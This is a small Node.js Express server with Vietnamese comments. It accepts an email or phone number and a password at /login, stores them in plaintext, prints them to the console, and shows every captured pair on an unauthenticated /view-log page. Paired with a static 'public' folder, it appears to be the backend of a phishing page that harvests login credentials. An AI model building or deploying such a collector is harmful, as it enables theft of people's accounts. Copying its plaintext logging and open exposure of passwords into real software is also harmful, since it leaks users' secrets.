const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const port = 3000;

// Mảng lưu trữ thông tin đăng nhập
const loginData = [];

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Route POST để lưu thông tin đăng nhập
app.post("/login", (req, res) => {
  const { emailOrPhone, password } = req.body;

  if (!emailOrPhone || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Vui lòng nhập đủ thông tin." });
  }

  const logEntry = `Email/Số điện thoại: ${emailOrPhone}, Mật khẩu: ${password}`;
  loginData.push(logEntry); // Lưu vào mảng

  console.log("Dữ liệu lưu:", logEntry);

  // Trả về phản hồi thành công mà không cần redirect từ server
  res.json({ success: true });
});

// Route GET để xem thông tin đăng nhập đã lưu
app.get("/view-log", (req, res) => {
  console.log("Dữ liệu hiện có:", loginData); // Kiểm tra dữ liệu đã lưu
  if (loginData.length === 0) {
    return res.status(404).send("<h1>Không có dữ liệu đăng nhập nào!</h1>");
  }

  res.send(`
    <html>
      <head>
        <title>Thông tin đăng nhập</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            margin: 20px;
          }
          h1 {
            color: #333;
          }
          pre {
            background-color: #f4f4f4;
            padding: 20px;
            border-radius: 5px;
          }
        </style>
      </head>
      <body>
        <h1>Thông tin đăng nhập đã lưu</h1>
        <pre>${loginData.join("\n----------------------\n")}</pre>
      </body>
    </html>
  `);
});

// Chạy server trên port 3000
app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
